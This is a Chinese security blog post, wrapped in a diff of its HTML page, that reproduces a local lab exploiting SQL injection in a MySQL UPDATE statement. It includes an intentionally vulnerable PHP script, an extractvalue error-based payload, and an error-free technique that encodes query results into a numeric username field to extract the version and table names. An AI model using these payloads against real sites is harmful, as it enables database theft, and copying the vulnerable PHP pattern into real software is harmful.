@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>在Update的注入中如果关闭了显示错误怎么办 | Homaebic-Know thyself</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="web,web安全,ctf,安全">
+  
+
+  <meta name="description" content="老外发表了一篇文章， MySQL Injection in Update, Insert and Delete 我本地复现了一下。再次深入的理解了皓宝宝说的“所有的盲注都需要通过外部信道的方式将数据显示出来”。 有这样一种情况：123456789101112131415161718192021222324252627282930313233&amp;lt;?php$mysqli = new mysqli(">
+<meta property="og:type" content="article">
+<meta property="og:title" content="在Update的注入中如果关闭了显示错误怎么办">
+<meta property="og:url" content="http://hebic.me/2017/08/19/在Update的注入中如果关闭了显错该怎么办/index.html">
+<meta property="og:site_name" content="Homaebic-Know thyself">
+<meta property="og:description" content="老外发表了一篇文章， MySQL Injection in Update, Insert and Delete 我本地复现了一下。再次深入的理解了皓宝宝说的“所有的盲注都需要通过外部信道的方式将数据显示出来”。 有这样一种情况：123456789101112131415161718192021222324252627282930313233&amp;lt;?php$mysqli = new mysqli(">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://120.25.80.195:7230/04/4050739586.png">
+<meta property="og:image" content="http://120.25.80.195:7230/04/1384089942.png">
+<meta property="og:image" content="http://120.25.80.195:7230/04/2640595512.png">
+<meta property="og:image" content="http://120.25.80.195:7230/04/225086679.png">
+<meta property="og:image" content="http://120.25.80.195:7230/04/3824068723.png">
+<meta property="og:image" content="http://120.25.80.195:7230/04/3909383866.png">
+<meta property="og:image" content="http://120.25.80.195:7230/04/746086481.png">
+<meta property="og:image" content="http://120.25.80.195:7230/04/4197201828.png">
+<meta property="og:updated_time" content="2017-08-20T00:54:46.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="在Update的注入中如果关闭了显示错误怎么办">
+<meta name="twitter:description" content="老外发表了一篇文章， MySQL Injection in Update, Insert and Delete 我本地复现了一下。再次深入的理解了皓宝宝说的“所有的盲注都需要通过外部信道的方式将数据显示出来”。 有这样一种情况：123456789101112131415161718192021222324252627282930313233&amp;lt;?php$mysqli = new mysqli(">
+<meta name="twitter:image" content="http://120.25.80.195:7230/04/4050739586.png">
+
+  
+
+  
+    <link rel="icon" href="/favicon.ico">
+  
+
+  <link href="/css/styles.css?v=c114cbe6" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/personal-style.css">
+  
+
+  
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  
+  <script type="text/javascript">
+	(function(){
+	    var bp = document.createElement('script');
+	    var curProtocol = window.location.protocol.split(':')[0];
+	    if (curProtocol === 'https') {
+	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+	    }
+	    else {
+	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+	    }
+	    var s = document.getElementsByTagName("script")[0];
+	    s.parentNode.insertBefore(bp, s);
+	})();
+  </script>
+
+
+
+  
+    <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  
+</head>
+</html>
+<body>
+
+
+  
+
+  <div class="post-header">
+   
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#有这样一种情况："><span class="toc-text">有这样一种情况：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#如果关闭mysql显示错误模式，我们该怎么得到数据呢？"><span class="toc-text">如果关闭mysql显示错误模式，我们该怎么得到数据呢？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#如果得到的数字超出mysql的范围了怎么办？"><span class="toc-text">如果得到的数字超出mysql的范围了怎么办？</span></a></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-在Update的注入中如果关闭了显错该怎么办" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">在Update的注入中如果关闭了显示错误怎么办</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2017.08.19</span>
+      </span>
+
+      
+
+      
+
+
+      
+        <span>
+          <i class="icon-comment"></i>
+          <a href="http://hebic.me/2017/08/19/在Update的注入中如果关闭了显错该怎么办/#disqus_thread"></a>
+        </span>
+      
+
+      
+      <i class="fa fa-eye"></i> 
+        <span id="busuanzi_container_page_pv">
+           &nbsp热度 <span id="busuanzi_value_page_pv">
+           <i class="fa fa-spinner fa-spin"></i></span>℃
+        </span>
+      
+
+      
+      
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <p>老外发表了一篇文章， <a href="https://osandamalith.com/2017/02/08/mysql-injection-in-update-insert-and-delete/" target="_blank" rel="noopener">MySQL Injection in Update, Insert and Delete</a> 我本地复现了一下。再次深入的理解了皓宝宝说的“所有的盲注都需要通过外部信道的方式将数据显示出来”。</p>
+<h2 id="有这样一种情况："><a href="#有这样一种情况：" class="headerlink" title="有这样一种情况："></a>有这样一种情况：</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$mysqli = <span class="keyword">new</span> mysqli(<span class="string">"localhost"</span>, <span class="string">"root"</span>, <span class="string">"root"</span>, <span class="string">"security"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* check connection */</span></span><br><span class="line"><span class="keyword">if</span> ($mysqli-&gt;connect_errno) &#123;</span><br><span class="line">    printf(<span class="string">"Connect failed: %s\\n"</span>, $mysqli-&gt;connect_error);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$mysqli-&gt;query(<span class="string">"set names utf8"</span>);</span><br><span class="line"></span><br><span class="line">$id = @$_GET[<span class="string">'id'</span>];</span><br><span class="line">$username = @$_GET[<span class="string">'username'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Select queries return a resultset */</span></span><br><span class="line">$sql1 = <span class="string">"UPDATE users SET username ='$username' WHERE id = '$id'"</span>;</span><br><span class="line"></span><br><span class="line">$sql2 = <span class="string">"SELECT * FROM users WHERE id = '$id'"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$result = $mysqli-&gt;query( $sql1 );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($result = $mysqli-&gt;query( $sql2 )) &#123;</span><br><span class="line">	$row = $result-&gt;fetch_array(MYSQLI_ASSOC);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'ID='</span>.$id.<span class="string">'的用户名变为为'</span>.$row[<span class="string">'username'</span>];</span><br><span class="line">    <span class="comment">/* free result set */</span></span><br><span class="line">    $result-&gt;close();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    var_dump($mysqli-&gt;error);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$mysqli-&gt;close();</span><br></pre></td></tr></table></figure>
+<p><img src="http://120.25.80.195:7230/04/4050739586.png" alt="QQ截图20170428224344.png"></p>
+<p>输入<code>?id=1&amp;username=hebic</code> 会将id=1的用户id修改为hebic。在mysql开启报错的情况下，可以使用几种报错函数得到结果，payload之一：<code>?id=1&amp;username=wakakaka&#39; or extractvalue(1,concat(0x7e,database())) or&#39;</code>就可以得到数据。具体的文章：<a href="http://wooyun.jozxing.cc/static/drops/tips-2078.html" target="_blank" rel="noopener">利用insert，update和delete注入获取数据</a></p>
+<h2 id="如果关闭mysql显示错误模式，我们该怎么得到数据呢？"><a href="#如果关闭mysql显示错误模式，我们该怎么得到数据呢？" class="headerlink" title="如果关闭mysql显示错误模式，我们该怎么得到数据呢？"></a>如果关闭mysql显示错误模式，我们该怎么得到数据呢？</h2><p>先看payload：<code>?id=1&amp;username=test&#39;| conv(hex(substr(version(),1,8)),16,10);&#39;</code></p>
+<p><img src="http://120.25.80.195:7230/04/1384089942.png" alt="1.png"></p>
+<p>我们这样处理得到的用户名<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">unhex</span>(<span class="keyword">conv</span>(<span class="number">58472576988467</span>,<span class="number">10</span>,<span class="number">16</span>));</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://120.25.80.195:7230/04/2640595512.png" alt="2.png"></p>
+<p>需要的数据就出现了。</p>
+<p>这个注入的思路是：<em>利用mysql的特性，字符串和数字或运算得到数字</em><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> (<span class="keyword">select</span> <span class="keyword">version</span>()|<span class="number">999</span>);</span><br></pre></td></tr></table></figure></p>
+<p><em><br><img src="http://120.25.80.195:7230/04/225086679.png" alt="7.png"></em></p>
+<p>因此UPDATE users SET username = ‘字符串’|数字 …… 就可以将用户名变为数字。</p>
+<p>之后，把数据转换为数字与用户名或运算，将返回的用户名解码得到结果。</p>
+<p>有两个函数的组合可以将字符转换为数组：hex和conv<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">conv</span>(<span class="keyword">hex</span>(<span class="keyword">version</span>()),<span class="number">16</span>,<span class="number">10</span>);</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://120.25.80.195:7230/04/3824068723.png" alt="8.png"></p>
+<p>把它填到“数字”的位置，就可以像演示的一样得到数据了。</p>
+<h2 id="如果得到的数字超出mysql的范围了怎么办？"><a href="#如果得到的数字超出mysql的范围了怎么办？" class="headerlink" title="如果得到的数字超出mysql的范围了怎么办？"></a>如果得到的数字超出mysql的范围了怎么办？</h2><p>如果要得到一些比较长的数据，也许就超过了mysql支持的最大整数18446744073709551615</p>
+<p><img src="http://120.25.80.195:7230/04/3909383866.png" alt="4.png"></p>
+<p>那只需要用substring()函数来截取得到的数据，分次将结果拼起来就可以了。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> <span class="keyword">users</span> <span class="keyword">set</span> username = <span class="string">'test'</span>| <span class="keyword">conv</span>(<span class="keyword">hex</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">5</span>)),<span class="number">16</span>,<span class="number">10</span>);' where id='1';</span><br></pre></td></tr></table></figure>
+<p>得到第一个用户名<br>解码<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">unhex</span>(<span class="keyword">conv</span>(<span class="number">491327481202</span>,<span class="number">10</span>,<span class="number">16</span>));</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://120.25.80.195:7230/04/746086481.png" alt="5.png"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> <span class="keyword">users</span> <span class="keyword">set</span> username = <span class="string">'test'</span>| <span class="keyword">conv</span>(<span class="keyword">hex</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>),<span class="number">5</span>,<span class="number">10</span>)),<span class="number">16</span>,<span class="number">10</span>);' where id='1';</span><br></pre></td></tr></table></figure>
+<p>得到第二个用户名<br>解码<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">unhex</span>(<span class="keyword">conv</span>(<span class="number">1919251059</span>,<span class="number">10</span>,<span class="number">16</span>));</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://120.25.80.195:7230/04/4197201828.png" alt="6.png"></p>
+<p>得到完整的数据。insert也可以使用此种方法，也可以使用同样的方法得到数据。</p>
+
+    
+  </div>
+</article>
+
+
+   
+  <div class="text-center donation">
+    <div class="inner-donation">
+      <span class="btn-donation">支持一下</span>
+      <div class="donation-body">
+        <div class="tip text-center">扫一扫，支持forsigner</div>
+        <ul class="theme.donation.items.length">
+        
+          <li class="item">
+            <img src="/images/qr-wechat.png" alt="">
+          </li>
+        
+          <li class="item">
+            <img src="/images/qr-alipay.png" alt="">
+          </li>
+        
+        </ul>
+      </div>
+    </div>
+  </div>
+
+
+   
+  <div class="box-prev-next clearfix">
+    <a class="show pull-left" href="/2017/08/19/CSP绕过姿势总结（2017.3.1更新）/">
+        <i class="icon icon-angle-left"></i>
+    </a>
+    <a class="show pull-right" href="/2017/08/19/利用DNS通道传输一点数据/">
+        <i class="icon icon-angle-right"></i>
+    </a>
+  </div>
+
+
+
+
+</div>
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">关闭</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/archives/" rel="noopener noreferrer" target="_self">
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/category/" rel="noopener noreferrer" target="_self">
+              分类
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/tag/" rel="noopener noreferrer" target="_self">
+              标签
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/link/" rel="noopener noreferrer" target="_self">
+              友链
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/about/" rel="noopener noreferrer" target="_self">
+              关于
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/atom.xml" rel="noopener noreferrer" target="_self">
+              RSS
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/search/" rel="noopener noreferrer" target="_self">
+              搜索
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+  <section class="disqus-comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </div>
+  </section>
+
+  <script>
+    var disqus_shortname = 'forsigner';
+    
+    var disqus_url = 'http://hebic.me/2017/08/19/在Update的注入中如果关闭了显错该怎么办/';
+    
+    (function(){
+      var dsq = document.createElement('script');
+      dsq.type = 'text/javascript';
+      dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+  </script>
+
+  <script id="dsq-count-scr" src="//forsigner.disqus.com/count.js" async></script>
+
+
+
+    
+
+
+
+
+    
+
+    
+	
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
